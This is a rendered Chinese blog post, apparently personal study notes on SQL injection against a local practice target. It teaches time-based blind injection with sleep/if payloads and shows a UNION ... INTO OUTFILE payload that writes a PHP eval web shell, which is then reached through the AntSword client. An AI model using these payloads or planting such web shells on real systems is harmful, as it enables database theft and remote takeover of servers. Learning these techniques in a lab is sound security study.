@@ -1,0 +1,123 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#8 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#8</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-07T02:40:29.000Z" id="date"> 2023-06-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-19T02:08:52.257Z" id="updated"> 2023-06-19</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习时间盲注和文件上传注入</p>
+<span id="more"></span>
+
+<h1 id="1-时间注入-Basic"><a href="#1-时间注入-Basic" class="headerlink" title="1 时间注入-Basic"></a>1 时间注入-Basic</h1><ol>
+<li><p>函数 sleep(n)</p>
+<p>n可以填任何int，</p>
+<p>用处就是休眠n秒，这个应该不难理解</p>
+</li>
+<li><p>if判断语句</p>
+<p>语法：if(判断条件,true执行语句,false执行语句)</p>
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select if(1=2,sleep(0),sleep(2));<br>+---------------------------+<br>| if(1=2,sleep(0),sleep(2)) |<br>+---------------------------+<br>|                         0 |<br>+---------------------------+<br>1 row in set (2.00 sec)<br><br>mysql&gt; select if(1=1,sleep(0),sleep(2));<br>+---------------------------+<br>| if(1=1,sleep(0),sleep(2)) |<br>+---------------------------+<br>|                         0 |<br>+---------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>其实他就相当于下面的python代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">if</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>:<br>	sleep(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span>:<br>	sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这两个函数很简单</p>
+</li>
+</ol>
+<p>那如何在实战中使用呢？</p>
+<p>首先使用时间盲注的情境时界面没有返回值（回显点）</p>
+<p>那我们可以通过页面响应时间来布尔盲注</p>
+<p>使用语句基本如下：</p>
+
+
+<h1 id="2-时间注入-实战注入"><a href="#2-时间注入-实战注入" class="headerlink" title="2 时间注入-实战注入"></a>2 时间注入-实战注入</h1><p>布尔盲注最痛苦的就是极其漫长的注入的过程了，</p>
+<p>有空写个爆破的脚本。。。。</p>
+<p>我这里就只做前面基本爆破数据库名</p>
+<p>（其实实战中不用这样，直接database()就好了，</p>
+<p>（这里只是打靶演示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and if((ascii(substr(database(),1,1))=105),sleep(0),sleep(2))--+<br><br>?id=1&#x27; and if((ascii(substr(database(),2,1))=101),sleep(0),sleep(2))--+<br>.............<br></code></pre></td></tr></table></figure>
+
+<p>点到为止😏</p>
+<hr>
+<p>关于盲注，这里有一篇极好的文章可以研究研究：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170626">一篇文章带你深入理解 SQL 盲注</a></p>
+<h1 id="3-文件上传注入-Basic"><a href="#3-文件上传注入-Basic" class="headerlink" title="3 文件上传注入-Basic"></a>3 文件上传注入-Basic</h1><p>首先判断是否具备文件上传的读写权限</p>
+<p>在你的mysql中输入下面这段话：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show variables like &#x27;%secure%&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>然后看secure_file_priv所对应的值</p>
+<p>我这里出现的是：NULL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">+--------------------------+-------+<br>| Variable_name            | Value |<br>+--------------------------+-------+<br>| require_secure_transport | OFF   |<br>| secure_auth              | ON    |<br>| secure_file_priv         | NULL  |<br>+--------------------------+-------+<br>3 rows in set, 1 warning (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>NULL 代表不具备读写权限</li>
+<li>单元格为空 则代表具备读写权限</li>
+<li>有具体路径 则代表具备对指定目录的读写权限</li>
+</ul>
+<p>这里为了打靶我开启了权限，其法：</p>
+<blockquote>
+<p>去MySQL目录里搜my.ini，在mysqld下面添secure_file_priv&#x3D;””<br>记得保存，最后重启MySQL就行了</p>
+</blockquote>
+<p>文件上传要点</p>
+
+
+<h1 id="4-文件上传注入-实战注入"><a href="#4-文件上传注入-实战注入" class="headerlink" title="4 文件上传注入-实战注入"></a>4 文件上传注入-实战注入</h1><p>构造如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;你的密码&#x27;]);?&gt;&quot;,3 into outfile &quot;你的路径&quot; --+<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>路径需要双斜杠，例如</p>
+<p>D:\\Home\\phpstudy_pro\\WWW\\ben.php</p>
+</li>
+</ul>
+<p>然后用蚁剑连一下，</p>
+<p>下载，配置环境不说了，</p>
+<p>连接地址就是你的靶场地址</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/ben.php<br></code></pre></td></tr></table></figure>
+
+<p>密码一句话木马里面的填的</p>
+<p>然后测试连接出现这种就成功了</p>
+
+
+<p>然后就相当于远控上线了一样，</p>
+<p>随便你干什么了</p>
+<h1 id="5-最后"><a href="#5-最后" class="headerlink" title="5 最后"></a>5 最后</h1><p>今天的内容可以扩展出很多，</p>
+<p>例如一句话木马的免杀等</p>
+<p>还有蚁剑的使用。。。。。</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9/">← Next Sql注入学习笔记#9</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/06/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7/">Sql注入学习笔记#7 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5-Basic"><span class="toc-number">1.</span> <span class="toc-text">1 时间注入-Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5-%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">2 时间注入-实战注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5-Basic"><span class="toc-number">3.</span> <span class="toc-text">3 文件上传注入-Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5-%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">4 文件上传注入-实战注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E6%9C%80%E5%90%8E"><span class="toc-number">5.</span> <span class="toc-text">5 最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
